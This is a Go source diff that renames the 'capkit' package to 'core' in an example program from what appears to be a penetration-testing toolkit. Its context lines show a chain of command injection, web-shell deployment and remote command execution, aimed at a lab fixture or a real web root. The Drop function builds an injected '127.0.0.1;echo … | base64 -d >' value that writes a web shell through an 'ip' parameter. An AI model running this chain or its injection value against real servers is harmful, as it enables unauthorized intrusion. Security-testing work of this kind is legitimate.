@@ -27,11 +27,11 @@ import (
 	"strings"
 	"time"
 
-	"github.com/c1ayooo/capkit"
 	"github.com/c1ayooo/capkit/adapters/auditlog"
 	"github.com/c1ayooo/capkit/adapters/httpx"
 	"github.com/c1ayooo/capkit/adapters/settings"
 	"github.com/c1ayooo/capkit/all"
+	"github.com/c1ayooo/capkit/core"
 	"github.com/c1ayooo/capkit/examples/lab"
 	"github.com/c1ayooo/capkit/gates"
 	"github.com/c1ayooo/capkit/kits/sessionkit"
@@ -47,7 +47,7 @@ func main() {
 	flag.Parse()
 
 	ctx := context.Background()
-	cc := capkit.CallContext{ProjectID: 1, Actor: "webshell-chain-example"}
+	cc := core.CallContext{ProjectID: 1, Actor: "webshell-chain-example"}
 
 	// ---- the target: either the local fixture or a real web root ----
 	var target, webroot string
@@ -90,10 +90,10 @@ func main() {
 		log.Fatal(err)
 	}
 
-	reg := capkit.NewRegistry()
-	for _, add := range []func(*capkit.Registry) error{
+	reg := core.NewRegistry()
+	for _, add := range []func(*core.Registry) error{
 		all.RegisterExploit, all.RegisterHTTP,
-		func(r *capkit.Registry) error { return all.RegisterSessionWithDeployer(r, deployer) },
+		func(r *core.Registry) error { return all.RegisterSessionWithDeployer(r, deployer) },
 	} {
 		if err := add(reg); err != nil {
 			log.Fatal(err)
@@ -142,7 +142,7 @@ func main() {
 	})
 	ran := call(rt, ctx, cc, "cmdi_execute", execInput)
 	fmt.Println("status:", ran.Status, "| summary:", ran.Summary)
-	if ran.Status != capkit.StatusSuccess {
+	if ran.Status != core.StatusSuccess {
 		fatal("cmdi_execute failed: %s", ran.Summary)
 	}
 	// The response body deliberately does not ride in Data (docs §5.5.4); it is
@@ -161,7 +161,7 @@ func main() {
 	})
 	dropped := call(rt, ctx, cc, "webshell_deploy", deployInput)
 	fmt.Println("status:", dropped.Status, "| summary:", dropped.Summary)
-	if dropped.Status != capkit.StatusSuccess {
+	if dropped.Status != core.StatusSuccess {
 		fatal("webshell_deploy failed: %s / %+v", dropped.Summary, dropped.Error)
 	}
 	var dropData struct {
@@ -196,7 +196,7 @@ func main() {
 	})
 	opened := call(rt, ctx, cc, "session_open", openInput)
 	fmt.Println("status:", opened.Status, "| summary:", opened.Summary)
-	if opened.Status != capkit.StatusSuccess {
+	if opened.Status != core.StatusSuccess {
 		fatal("session_open failed: %s / %+v", opened.Summary, opened.Error)
 	}
 	var openData struct {
@@ -213,7 +213,7 @@ func main() {
 	})
 	inSession := call(rt, ctx, cc, "session_exec", execIn)
 	fmt.Println("status:", inSession.Status, "| summary:", inSession.Summary)
-	if inSession.Status != capkit.StatusSuccess {
+	if inSession.Status != core.StatusSuccess {
 		fatal("session_exec failed: %s", inSession.Summary)
 	}
 	fmt.Println("output:", firstLines(outputText(inSession), 3))
@@ -246,13 +246,13 @@ func main() {
 // probeAnonymous fetches a URL through the runtime's own gate-aware transport
 // with no session, so "is the shell still reachable?" is answered by the target
 // rather than by a local filesystem check.
-func probeAnonymous(rt *runtime.Runtime, ctx context.Context, cc capkit.CallContext, url string) int {
+func probeAnonymous(rt *runtime.Runtime, ctx context.Context, cc core.CallContext, url string) int {
 	in, _ := json.Marshal(map[string]any{"url": url})
 	res, err := rt.Call(ctx, "http_probe", in, cc)
 	if err != nil {
 		return 0
 	}
-	if res.Status != capkit.StatusSuccess {
+	if res.Status != core.StatusSuccess {
 		fmt.Println("  (probe reported:", res.Summary, ")")
 		return 0
 	}
@@ -271,7 +271,7 @@ func probeAnonymous(rt *runtime.Runtime, ctx context.Context, cc capkit.CallCont
 // form, an LFI log-poisoning route, an SMB write); the point is that the tool
 // itself never touches the target.
 type cmdDeployer struct {
-	http capkit.HTTPDoer
+	http core.HTTPDoer
 	dir  string
 	url  string
 }
@@ -289,7 +289,7 @@ func (d *cmdDeployer) Drop(ctx context.Context, req shellkit.WebShellDrop) (*she
 	}
 	cmd := fmt.Sprintf("echo %s | base64 -d > %s", encoded, shellQuote(target))
 	injected := d.url + "?ip=" + url.QueryEscape("127.0.0.1;"+cmd)
-	res, err := d.http.Do(ctx, capkit.Request{Method: "GET", URL: injected, Timeout: 30 * time.Second})
+	res, err := d.http.Do(ctx, core.Request{Method: "GET", URL: injected, Timeout: 30 * time.Second})
 	if err != nil {
 		return nil, err
 	}
@@ -306,7 +306,7 @@ func (d *cmdDeployer) Drop(ctx context.Context, req shellkit.WebShellDrop) (*she
 // transport. It is the "host provides the Executor" boundary from shellkit's
 // README, wired the way a real host would.
 type httpExecutor struct {
-	http capkit.HTTPDoer
+	http core.HTTPDoer
 	dir  string
 	base string
 }
@@ -317,7 +317,7 @@ func (e *httpExecutor) do(ctx context.Context, s session.Session, query url.Valu
 		return nil, err
 	}
 	u.RawQuery = query.Encode()
-	res, err := e.http.Do(ctx, capkit.Request{Method: "GET", URL: u.String(), Timeout: 60 * time.Second})
+	res, err := e.http.Do(ctx, core.Request{Method: "GET", URL: u.String(), Timeout: 60 * time.Second})
 	if err != nil {
 		return nil, err
 	}
@@ -336,7 +336,7 @@ func (e *httpExecutor) File(ctx context.Context, s session.Session, op session.F
 
 // ---- plumbing ----
 
-func call(rt *runtime.Runtime, ctx context.Context, cc capkit.CallContext, tool string, input json.RawMessage) capkit.Result {
+func call(rt *runtime.Runtime, ctx context.Context, cc core.CallContext, tool string, input json.RawMessage) core.Result {
 	res, err := rt.Call(ctx, tool, input, cc)
 	if err != nil {
 		fatal("%s: %v", tool, err)
@@ -352,7 +352,7 @@ func fatal(format string, args ...any) {
 // outputText pulls the stdout out of a tool result. session_exec returns it in
 // Data; the cmdi tools deliberately do not (their body goes to evidence), which
 // is why the example prints the evidence preview for those steps instead.
-func outputText(res capkit.Result) string {
+func outputText(res core.Result) string {
 	var d struct {
 		Stdout string `json:"stdout"`
 	}
@@ -362,7 +362,7 @@ func outputText(res capkit.Result) string {
 
 // evidencePreview returns the stored body's preview, which is the only place a
 // tool-returned body surfaces without a separate evidence fetch.
-func evidencePreview(res capkit.Result) string {
+func evidencePreview(res core.Result) string {
 	if len(res.Evidence) == 0 {
 		return ""
 	}
